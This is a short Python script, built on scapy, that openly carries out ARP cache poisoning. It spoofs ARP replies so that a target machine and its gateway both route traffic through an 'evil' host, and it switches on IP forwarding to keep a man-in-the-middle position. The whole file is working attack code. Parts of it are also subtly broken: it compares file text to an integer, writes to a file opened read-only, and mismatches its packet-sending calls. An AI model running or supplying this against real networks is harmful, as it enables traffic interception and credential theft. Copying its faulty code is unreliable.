#!/usr/bin/python3
from scapy.all import *
import argparse


def checkProc():
    with open('/proc/sys/net/ipv4/ip_forward') as f:
        if f.read() == 0:
            f.seek(0)
            f.write(1)
            f.truncate()
            print("Overwritten /proc/sys/net/ipv4/ip_forward val to 1")


def poison(target, evilIP, gateway):
    # pick up evil MAC address for later
    getArp = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=gateway, psrc=evilIP)
    response = srp(getArp, timeout=3)
    evilMac = response[0][0][1].hwsrc

    if not evilMac:
        print(" [X] Couldn't pick up a MAC address to spoof for %s" % evilIP)
        return

    # now send the gateway's details to the target
    gatewaySpoof = ARP(op=2, psrc=target, pdst=gateway, hwsrc=evilMac)

    # then trick the target
    targetSpoof = ARP(op=2, psrc=gateway, pdst=target, hwsrc=evilMac)

    return [gatewaySpoof, targetSpoof]


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Poison a target''s ARP cache with a given MAC address')
    parser.add_argument('-t', metavar='target', help='the target whose ARP cache we''re going for')
    parser.add_argument('-e', metavar='evil', help='the IP address we are spoofing traffic to')
    parser.add_argument('-g', metavar='gateway', help='the gateway we are fooling')

    checkProc()

    args = parser.parse_args()
    target = args.t
    evil = args.e
    gateway = args.g

    packets = poison(target, evil, gateway)

    for pkt in packets:
        #try:
            rr = srp(pkt, timeout=2)
            print(rr[0].show())
        #except:
            #print("failed to send packet")
